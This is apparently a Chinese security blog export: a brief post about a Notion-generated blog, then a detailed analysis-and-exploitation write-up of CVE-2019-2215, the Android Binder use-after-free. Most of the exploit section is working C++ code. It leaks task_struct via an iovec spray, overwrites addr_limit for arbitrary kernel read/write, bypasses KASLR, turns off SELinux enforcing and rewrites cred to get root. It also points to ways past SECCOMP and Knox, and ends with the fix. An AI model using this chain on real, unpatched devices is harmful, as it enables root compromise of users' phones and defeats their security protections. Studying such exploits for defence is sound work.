[{"content":"博客正常运行中 H1 本博客基于Notion页面自动生成\nPublish地址：https://kuekiko.notion.site/14acc4eb33a24554a9224b2eafb61140?v=e0b848538c0c43108feebfcb8107f9c5\u0026amp;pvs=4\n转发地址：notion.ykiko.top\n特性 在Notion编写的文档自动更新到博客\n可定制更新频率，可实时更新也可定期更新\n自动备份相关文档\nNotion自动生成测试\n本文的Notion链接为：https://kuekiko.notion.site/6e834359fd8445b7b5005bc7c58d6c57?pvs=4\n每10分钟更新一次\n","date":"2023-09-01T00:00:00Z","permalink":"https://ykiko.top/p/%E5%8D%9A%E5%AE%A2%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C%E4%B8%AD/","title":"博客正常运行中"},{"content":"CVE-2019-2215分析利用记录 0x00 前言 CVE-2019-2215最初是由syzbot(syzkaller bot)在2017年发现的一个bug，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。\nProject Zero的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该漏洞。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。\n0x01 分析环境 Android avd api29 x86_64\nkernel：q-goldfish-android-goldfish-4.14-dev commit id 7a3cee43e935b9d526ad07f20bf005ba7e74d05b\npixel Android 10 kernel 3.18\n0x02 漏洞分析 漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。\n原理分析 先看一个project-zero公开的poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* binder_poll() passes the thread-\u0026gt;wait waitqueue that can be slept on for work. When a thread that uses epoll explicitly exits using BINDER_THREAD_EXIT, the waitqueue is freed, but it is never removed from the corresponding epoll data structure. When the process subsequently exits, the epoll cleanup code tries to access the waitlist, which results in a use-after-free. */ #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/epoll.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #define BINDER_THREAD_EXIT 0x40046208ul int main() { int fd, epfd; struct epoll_event event = {.events = EPOLLIN}; fd = open(\u0026#34;/dev/binder\u0026#34;, O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, \u0026amp;event); //[1] ioctl(fd, BINDER_THREAD_EXIT, NULL); //[2] } 漏洞原理作者说的很简单就是使用epoll线程调用BINDER_THREAD_EXIT时，会把binder_thread释放，但是没有在epoll数据结构中清除，在后面进程结束或者epoll主动调用EPOLL_CTL_DEL时，epoll又会去遍历前面释放的binder_thread-\u0026gt;wait，导致UAF。\n既然是个UAF的漏洞，我们主要关注三个点：binder_thread的allocate、free、use。\nallocate 在poc中的[1]处，通过epoll_ctl创建了一个新的ep_item并且绑定了fd，将其插入到event_poll的红黑树中。fd为前面通过调用open()创建的binder_proc结构体并且fd-\u0026gt;pricate_data = binder_proc，epfd为调用epoll_create创建的一个epoll结构体，该结构体会添加到结构体队列上。结构大概如图，图来源\nfree poc中的[2]处，调用ioctl对fd进行BINDER_THREAD_EXIT操作，从fd-\u0026gt;private_data中释放binder_thread结构体。整个调用栈如下图所示。最终调用到了binder_free_thread里的kfree释放掉。\n1 2 3 4 5 6 7 8 static void binder_free_thread(struct binder_thread *thread) { BUG_ON(!list_empty(\u0026amp;thread-\u0026gt;todo)); binder_stats_deleted(BINDER_STAT_THREAD); binder_proc_dec_tmpref(thread-\u0026gt;proc); put_task_struct(thread-\u0026gt;task); kfree(thread); } use 在当前线程退出时，会自动调用epoll_ctl(epfd, DEL, fd, event)，这里面会调用到ep_remove(event_poll, ep_item)，这个方法里面会进行unlink wait queues双链表操作，其中的操作entry = wait-\u0026gt;entry;这里的指针指向已经释放的binder_thread-\u0026gt;wait。造成use after free。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 static void ep_remove_wait_queue(struct eppoll_entry *pwq) //这里的pwq就是我们已经释放掉的binder_thread { wait_queue_head_t *whead; rcu_read_lock(); whead = smp_load_acquire(\u0026amp;pwq-\u0026gt;whead); if (whead) remove_wait_queue(whead, \u0026amp;pwq-\u0026gt;wait); //进入remove_wait_queue rcu_read_unlock(); } void remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry) { unsigned long flags; spin_lock_irqsave(\u0026amp;wq_head-\u0026gt;lock, flags); __remove_wait_queue(wq_head, wq_entry); //这里传入的第二个参数\u0026amp;pwq-\u0026gt;wait之前已经被释放 spin_unlock_irqrestore(\u0026amp;wq_head-\u0026gt;lock, flags); } static inline void __remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry) { list_del(\u0026amp;wq_entry-\u0026gt;entry); } static inline void list_del(struct list_head *entry) { __list_del_entry(entry); [...] } static inline void __list_del_entry(struct list_head *entry) { [...] __list_del(entry-\u0026gt;prev, entry-\u0026gt;next); } static inline void __list_del(struct list_head * prev, struct list_head * next) { next-\u0026gt;prev = prev; //unlink操作 WRITE_ONCE(prev-\u0026gt;next, next); } 将binder_thread-\u0026gt;wait.head的指针写入binder_thread-\u0026gt;wait.head.prev和binder_thread-\u0026gt;wait.head.next。\nPoc调试分析 这里手上没有直接能用的设备，用的模拟器调试。可直接按照这个教程的配置调试。不过这个教程关闭了一些保护，使得利用要简单些，不过过程是差不多一样的。\n编译完goldfish后启动emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S等待qemu的连接。\ngdb启动gdb -quiet vmlinux -ex 'target remote :1234' 键入c继续启动模拟器。\n等待模拟器完全启动后编译poc push进模拟器。\nbinder_thread释放之前，偏移a8处为wait.head的值，这里我们拥有内核源码以及编译好的vmliux，所以可以直接算出来wait.head相对于binder_thread地址的偏移量。\nfree之后未unlink之前binder_thread的值一样未变。\nunlink之后，binder_thread-\u0026gt;wait.head写入binder_thread-\u0026gt;wait.head.next and binder_thread-\u0026gt;wait.head.prev两个指针。\n在未开启KASan的设备上我们看不到任何奔溃。但是调试时我们能看到确实触发了漏洞。\n0x03 漏洞利用 漏洞t_thread结构体如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 struct binder_thread { struct binder_proc *proc; struct rb_node rb_node; struct list_head waiting_thread_node; int pid; int looper; /* only modified by this thread */ bool looper_need_return; /* can be written by other thread */ struct binder_transaction *transaction_stack; struct list_head todo; bool process_todo; struct binder_error return_error; struct binder_error reply_error; wait_queue_head_t wait; struct binder_stats stats; atomic_t tmp_ref; bool is_dead; struct task_struct *task; }; 注意看该结构体中有个task成员，为task_struct类型。我们首先要做的就是泄露这个结构体的地址，将它改为NULL之后，执行提权语句。下面根据exp分析整个提权的流程。\npatch addr_limit 阻止我们拿到权限的第一道关卡为task_struct结构体成员thread_info中的addr_limit（在x86_64上是直接作为task_struct的成员），用于隔离内核空间和用户空间。如果我们能控制它的值，相当于我们能完全的访问内核空间。所以第一步就是把addr_limit patch掉。\n想要patch掉addr_limit，得先泄露出task_struct的地址，再将值改为0xFFFFFFFFFFFFFFFE。后面再说为什么要改为这个值。\n这里先了解一下vectored I/O，也称为分散/聚集 I/O，是一种可以在单次系统调用中对多个缓冲区输入输出的方法，可以把多个缓冲区的数据写到单个数据流，也可以把单个数据流读到多个缓冲区中。与线性 I/O 相比，vectored I/O有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。支持原子性。使用vectored I/O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用而不是两个系统调用对其进行读取或写入。\nreadv() 函数从文件描述符 fd 中读取 count 个段 (segment) (一个段即一个 iovec 结构体）到参数 iov 所指定的缓冲区中。\nwrite() 函数从参数 iov 指定的缓冲区中读取 count 个段的数据，并写入 fd 中。\n1 2 3 #include \u0026lt;sys/uio.h\u0026gt; ssize_t readv (int fd, const struct iovec *iov,vint count); ssize_t writev(int fd,const struct iovec *iov, int count); 每个 iovec 结构体描述一个独立的，物理不连续的缓冲区，我们称其为段(segment)，每个iovec结构体相对较小，在64bit系统下iovec的大小仅为0x10。\n1 2 3 4 5 struct iovec { void __user *iov_base; /* BSD uses caddr_t (1003.1g requires void *) */ __kernel_size_t iov_len; /* Must be size_t (1003.1g) */ }; 如何泄露出task_struct？看了几个exp，都用的是struct iovec去占位覆盖前面释放的binder_thread。这也是Project Zero的做法。这个方法最初是由Keen实验室提出的，iovec具有一些小特性使得它很适合用来作为攻击的媒介：\n在64bit系统下只有0x10的大小\n容易控制它的成员iov_base和iov_len。\n可以控制写入的个数控制iovec最终进入哪个kmalloc缓存\n它有一个指向缓冲区的指针和一个长度，这是使用unlink进行破坏的理想字段\n可通过readv、writev、recvmsg、sendmsg等系统调用和iovec是实现linux下的Vectored I/O。在漏洞利用中我们可以利用来绕过检查，对已释放的空间进行占位布局堆风水。\n看看exp如何如来泄露信息，作者写了很详细的注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 void BinderUaF::leakTaskStruct() { int pipe_fd[2] = {0}; ssize_t nBytesRead = 0; static char dataBuffer[PAGE_SIZE] = {0}; struct iovec iovecStack[IOVEC_COUNT] = {nullptr}; // Get binder fd setupBinder(); // Create event poll setupEventPoll(); // We are going to use iovec for scoped read/write, // we need to make sure that iovec stays in the kernel // before we trigger the unlink after binder_thread has // been freed. // One way to achieve this is by using the blocking APIs // in Linux kernel. Such APIs are read, write, etc on pipe. // Setup pipe for iovec INFO(\u0026#34;[+] Setting up pipe\\n\u0026#34;); if (pipe(pipe_fd) == -1) { ERR(\u0026#34;\\t[-] Unable to create pipe\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Pipe created successfully\\n\u0026#34;); } // // pipe_fd[0] = read fd // pipe_fd[1] = write fd // // Default size of pipe is 65536 = 0x10000 = 64KB // This is way much of data that we care about // Let\u0026#39;s reduce the size of pipe to 0x1000 // if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) == -1) { ERR(\u0026#34;\\t[-] Unable to change the pipe capacity\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Changed the pipe capacity to: 0x%x\\n\u0026#34;, PAGE_SIZE); } INFO(\u0026#34;[+] Setting up iovecs\\n\u0026#34;); // // As we are overlapping binder_thread with iovec, // binder_thread-\u0026gt;wait.lock will align to iovecStack[10].io_base. // // If binder_thread-\u0026gt;wait.lock is not 0 then the thread will get // stuck in trying to acquire the lock and the unlink operation // will not happen. // // To avoid this, we need to make sure that the overlapped data // should be set to 0. // // iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if // we can pass a valid memory address whose lower 32bit value is 0, // then we can avoid spin lock issue. // mmap4gbAlignedPage(); iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE; // Now link the poll wait queue to binder thread wait queue linkEventPollWaitQueueToBinderThreadWaitQueue(); // // We should trigger the unlink operation when we // have the binder_thread reallocated as iovec array // // Now fork pid_t childPid = fork(); if (childPid == 0) { // // child process // There is a race window between the unlink and blocking // in writev, so sleep for a while to ensure that we are // blocking in writev before the unlink happens sleep(2); // Trigger the unlink operation on the reallocated chunk unlinkEventPollWaitQueueFromBinderThreadWaitQueue(); // // First interesting iovec will read 0x1000 bytes of data. // This is just the junk data that we are not interested in // nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer)); if (nBytesRead != PAGE_SIZE) { ERR(\u0026#34;\\t[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x\u0026#34;, nBytesRead, PAGE_SIZE); exit(EXIT_FAILURE); } exit(EXIT_SUCCESS); } // parent process // I have seen some races which hinders the reallocation. // So, now freeing the binder_thread after fork. // freeBinderThread(); // // Reallocate binder_thread as iovec array // // We need to make sure this writev call blocks // This will only happen when the pipe is already full // This print statement was ruining the reallocation, // spent a night to figure this out. Commenting the // below line. // // INFO(\u0026#34;[+] Reallocating binder_thread\\n\u0026#34;); ssize_t nBytesWritten = writev(pipe_fd[1], iovecStack, IOVEC_COUNT); // If the corruption was successful, the total bytes written // should be equal to 0x2000. This is because there are two // valid iovec and the length of each is 0x1000 if (nBytesWritten != PAGE_SIZE * 2) { ERR(\u0026#34;\\t[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x\\n\u0026#34;, nBytesWritten, PAGE_SIZE * 2); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Wrote 0x%lx bytes\\n\u0026#34;, nBytesWritten); } // Now read the actual data from the corrupted iovec // This is the leaked data from kernel address space // and will contain the task_struct pointer nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer)); if (nBytesRead != PAGE_SIZE) { ERR(\u0026#34;\\t[-] read failed. nBytesRead: 0x%lx, expected: 0x%x\u0026#34;, nBytesRead, PAGE_SIZE); exit(EXIT_FAILURE); } // Wait for the child process to exit wait(nullptr); m_task_struct = (struct task_struct *) *((int64_t *) (dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA)); m_pidAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, pid)); m_credAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, cred)); m_nsproxyAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, nsproxy)); INFO(\u0026#34;[+] Leaked task_struct: %p\\n\u0026#34;, m_task_struct); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;pid: %p\\n\u0026#34;, m_pidAddress); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;cred: %p\\n\u0026#34;, m_credAddress); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;nsproxy: %p\\n\u0026#34;, m_nsproxyAddress); } 很好理解，exp这部分首先初始化环境之后创建用于readv和writev的pipe，readv和writev函数用于在一次函数调用中读、写多个非连续缓冲区。修改pipe的size为0x1000。\n之后创建了25个iovec，放在iovecStack里面。25个是根据binder_thread和iovec的大小算出来\nIOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))\nbinder_thread结构体大小为408，25个iovec大小为25*16=400，正好。计算对比binder_thread中wait.head的偏移0xA0和iovecStack的偏移iovecStack[10].iov_len匹配。\n前面动态调试时也能看到会有两个地址的值会被写入地址，这里相对应的位置为iovecStack[10].iov_len 和iovecStack[11].io_base。所以我们这里要修改iovecStack[10]的iov_len和pipe一样的大小，阻塞掉父进程的writev系统调用，再去触发unlink操作。\n这里的iovecStack[10].io_base正好对上binder_thread-\u0026gt;wait.lock，如果这个值不为0的话，后面在尝试取自旋锁锁会出问题，不进行unlink操作，这个值是32bit的，iov_base是64bit的，所以要设置对齐，使用mmap保证低32bit为0。\niovecStack[10].iov_len和iovecStack[11].iov_len设置为pipe size的大小，iovecStack[11].io_base 设置为新分配的一个地址，\n创建fork子进程进行EPOLL_CTL_DEL操作触发unlink。读出0x1000 bytes的垃圾数据恢复进程，\n父进程free掉binder_thread，调用writev系统进行阻塞，等待子进程完成。\n最后父进程在调用read读出已经被子进程覆盖了内核地址处的数据，根据偏移读出泄露的task_struct指针。\n下面这张图是Project Zero blog贴出来的流程图，方便理解整个过程。\n既然已经有task_struct指针，接下来就可以patch 掉AddrLimit。直接看exp实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 void BinderUaF::clobberAddrLimit() { int sock_fd[2] = {0}; ssize_t nBytesWritten = 0; struct msghdr message = {nullptr}; struct iovec iovecStack[IOVEC_COUNT] = {nullptr}; // Get binder fd setupBinder(); // Create event poll setupEventPoll(); INFO(\u0026#34;[+] Setting up socket\\n\u0026#34;); if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) == -1) { ERR(\u0026#34;\\t[-] Unable to create socketpair\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Socketpair created successfully\\n\u0026#34;); } // // We will just write junk data to socket so that when recvmsg // is called it process the fist valid iovec with this junk data // and then blocks and waits for the rest of the data to be received // static char junkSocketData[] = { 0x41 }; INFO(\u0026#34;[+] Writing junk data to socket\\n\u0026#34;); nBytesWritten = write(sock_fd[1], \u0026amp;junkSocketData, sizeof(junkSocketData)); if (nBytesWritten != sizeof(junkSocketData)) { ERR(\u0026#34;\\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\\n\u0026#34;, nBytesWritten, sizeof(junkSocketData)); exit(EXIT_FAILURE); } // // Write junk data to the socket so that when recvmsg is // called, it process the first valid iovec with this junk // data and then blocks for the rest of the incoming socket data // INFO(\u0026#34;[+] Setting up iovecs\\n\u0026#34;); // We want to block after processing the iovec at IOVEC_WQ_INDEX, // because then, we can trigger the unlink operation and get the // next iovecs corrupted to gain scoped write. mmap4gbAlignedPage(); iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = 1; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8; iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242; iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8; // // Prepare the data buffer that will be written to socket // Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64 // will result in crash because of a check in do_page_fault // However, x86_64 does not have this check. But it\u0026#39;s better // to set it to 0xFFFFFFFFFFFFFFFE so that this same code can // be used in arm64 as well. // static uint64_t finalSocketData[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len (uint64_t) ((uint8_t *) m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value }; // // Prepare the message // message.msg_iov = iovecStack; message.msg_iovlen = IOVEC_COUNT; // // Now link the poll wait queue to binder thread wait queue // linkEventPollWaitQueueToBinderThreadWaitQueue(); // // We should trigger the unlink operation when we // have the binder_thread reallocated as iovec array // Now fork pid_t childPid = fork(); if (childPid == 0) { // // child process // There is a race window between the unlink and blocking // in writev, so sleep for a while to ensure that we are // blocking in writev before the unlink happens // sleep(2); // // Trigger the unlink operation on the reallocated chunk // unlinkEventPollWaitQueueFromBinderThreadWaitQueue(); // // Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len // and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered // // Write rest of the data to the socket so that recvmsg starts // processing the corrupted iovecs and we get scoped write and // finally arbitrary write nBytesWritten = write(sock_fd[1], finalSocketData, sizeof(finalSocketData)); if (nBytesWritten != sizeof(finalSocketData)) { ERR(\u0026#34;\\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\u0026#34;, nBytesWritten, sizeof(finalSocketData)); exit(EXIT_FAILURE); } exit(EXIT_SUCCESS); } // parent process // I have seen some races which hinders the reallocation. // So, now freeing the binder_thread after fork. freeBinderThread(); // Reallocate binder_thread as iovec array and // we need to make sure this recvmsg call blocks. // recvmsg will block after processing a valid iovec at // iovecStack[IOVEC_WQ_INDEX] ssize_t nBytesReceived = recvmsg(sock_fd[0], \u0026amp;message, MSG_WAITALL); // If the corruption was successful, the total bytes received // should be equal to length of all iovec. This is because there // are three valid iovec ssize_t expectedBytesReceived = iovecStack[IOVEC_WQ_INDEX].iov_len + iovecStack[IOVEC_WQ_INDEX + 1].iov_len + iovecStack[IOVEC_WQ_INDEX + 2].iov_len; if (nBytesReceived != expectedBytesReceived) { ERR(\u0026#34;\\t[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx\\n\u0026#34;, nBytesReceived, expectedBytesReceived); exit(EXIT_FAILURE); } // Wait for the child process to exit wait(nullptr); } 这里就要将addr_limit的值改为0xFFFFFFFFFFFFFFFE在arm64里有个检查函数do_page_fault会检测该值是否为0xFFFFFFFFFFFFFFFF，如果是就触发奔溃，所以一般都设为0xFFFFFFFFFFFFFFFE。\n前面是从内核读出数据，这里要实现的是向内核写入数据。\n看看这里的iovecStack结构：\n1 2 3 4 5 6 iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = 1; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8; iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242; iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8; 和前面泄露信息的布局是差不多。\n首先依然是初始化环境，先向socket写入了1byte的垃圾数据，之后父进程使用recvmsg系统调用接收了1byte的数据之后进行阻塞，这里选用了recvmsg而不是前面writev是因为iovecStack[10].iov_len变成了一个指针，很大的数字，后续调用copy_page_to_iter_iovec复制数据时会出错。\n子进程进行unlink操作，将精心构造的finalSocketData写入socket，父进程恢复接收数据，这时iovecStack[11]已经被破坏掉了，等到recvmsg系统调用返回时，就可以修改掉addr_limit的值。\n1 2 3 4 5 6 7 8 static uint64_t finalSocketData[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len (uint64_t) ((uint8_t *) m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value }; 对应上面的值。\n到这里我们就有了完整的内核读写权限，接下绕过kaslr、禁用SElinux、patchCred就可以获得root权限。\nbypass kaslr and Disabling SELinux 前面已经了有了完整的读写权限，那这就很简单了。\n任意读写的实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 void BinderUaF::kRead(void *Address, size_t Length, void *uBuffer) { ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], Address, Length); if ((size_t) nBytesWritten != Length) { ERR(\u0026#34;[-] Failed to write data from kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], uBuffer, Length); if ((size_t) nBytesRead != Length) { ERR(\u0026#34;[-] Failed to read data from kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } } void BinderUaF::kWrite(void *Address, size_t Length, void *uBuffer) { ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], uBuffer, Length); if ((size_t) nBytesWritten != Length) { ERR(\u0026#34;[-] Failed to write data from user: %p\u0026#34;, Address); exit(EXIT_FAILURE); } ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], Address, Length); if ((size_t) nBytesRead != Length) { ERR(\u0026#34;[-] Failed to write data to kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } } 任意读的话，利用write和read两个系统调用，使用write将数据写到pipe，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。任意写的话，与之相反。这样就实现了任意读写。\ntask_struct 有一个全局指针nsproxy ，前面已经泄露出来了，就可以更具偏移直接算出Kernel_base_addr。\n1 2 3 4 5 6 7 8 9 10 11 12 13 ptrdiff_t kernelBase = nsProxy - SYMBOL_OFFSET_init_nsproxy; auto selinuxEnforcing = (void *) (kernelBase + SYMBOL_OFFSET_selinux_enforcing); INFO(\u0026#34;\\t[*] nsproxy: 0x%lx\\n\u0026#34;, nsProxy); INFO(\u0026#34;\\t[*] Kernel base: 0x%lx\\n\u0026#34;, kernelBase); INFO(\u0026#34;\\t[*] selinux_enforcing: %p\\n\u0026#34;, selinuxEnforcing); int selinuxEnabled = kReadDword(selinuxEnforcing); if (!selinuxEnabled) { INFO(\u0026#34;\\t[*] selinux enforcing is disabled\\n\u0026#34;); return; } INFO(\u0026#34;\\t[*] selinux enforcing is enabled\\n\u0026#34;); kWriteDword(selinuxEnforcing, 0x0); 这里只需要对于SELinux只需根据kernelBase 计算出具体的地址，再直接进行写入0x0即可禁用掉。\n现在的版本越来越多保护和检查机制，实际上直接这样不一定是不可行，有时得恢复kallsyms表才行\nRoot 提权的常用语句commit_creds(prepare_kernel_cred(NULL));，这就是常规的套路了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, uid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, gid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, suid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, sgid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, euid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, egid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsuid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsgid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, securebits)), SECUREBITS_DEFAULT); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_inheritable)), CAP_EMPTY_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_permitted)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_effective)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_bset)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_ambient)), CAP_EMPTY_SET); 前面已经泄露出了task_struct-\u0026gt;cred的地址，这里就只用将事先准备好的cred结构体写入即可\n最后执行system(\u0026quot;/bin/sh\u0026quot;);、execve(\u0026quot;/system/bin/sh\u0026quot;);即可获得root权限。\nDisabling SECCOMP 额外的如果想要将提权程序捆绑到app上的还需要这一步，Android8开始，所有 Android 软件都使用系统调用与 Linux 内核进行通信，SECCOMP过滤器会检测所有的非法调用。SECCOMP过滤器是放在zygote 进程中，而所有的Android应用程序都是该进程fork出来的，按理所以会影响到所有的应用，但是Android安全团队进行了部分筛选，只会阻止某些系统调用。\n1 2 3 4 struct seccomp { int mode; struct seccomp_filter *filter; }; 想要禁用SECCOMP，直接将mode改为0是导致内核崩溃，需要清除TIF_SECCOMP 标志。这篇文章实现了绕过，感兴趣可以看一看。\n对于三星的设备，还需要绕过Knox/RKP才行。对于如何绕过，最近有人公开了s8相关的利用代码，感兴趣可以看看。\npatch patch\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 diff --git a/drivers/android/binder.c b/drivers/android/binder.c index a340766b51fe..2ef8bd29e188 100644 --- a/drivers/android/binder.c +++ b/drivers/android/binder.c @@ -4302,6 +4302,18 @@ static int binder_thread_release(struct binder_proc *proc, if (t) spin_lock(\u0026amp;t-\u0026gt;lock); } + +\t/* +\t* If this thread used poll, make sure we remove the waitqueue +\t* from any epoll data structures holding it with POLLFREE. +\t* waitqueue_active() is safe to use here because we\u0026#39;re holding +\t* the inner lock. +\t*/ +\tif ((thread-\u0026gt;looper \u0026amp; BINDER_LOOPER_STATE_POLL) \u0026amp;\u0026amp; +\twaitqueue_active(\u0026amp;thread-\u0026gt;wait)) { +\twake_up_poll(\u0026amp;thread-\u0026gt;wait, POLLHUP | POLLFREE); +\t} + binder_inner_proc_unlock(thread-\u0026gt;proc); if (send_reply) 在binder_thread free之前清理掉thread-\u0026gt;wait即可。\n总结 去年出的经典的提权漏洞，这个漏洞当做提权入门也还不错，可以学习到一个完整的提权流程和几个常见方法。\n后续真机测试过程中手上没pixel2 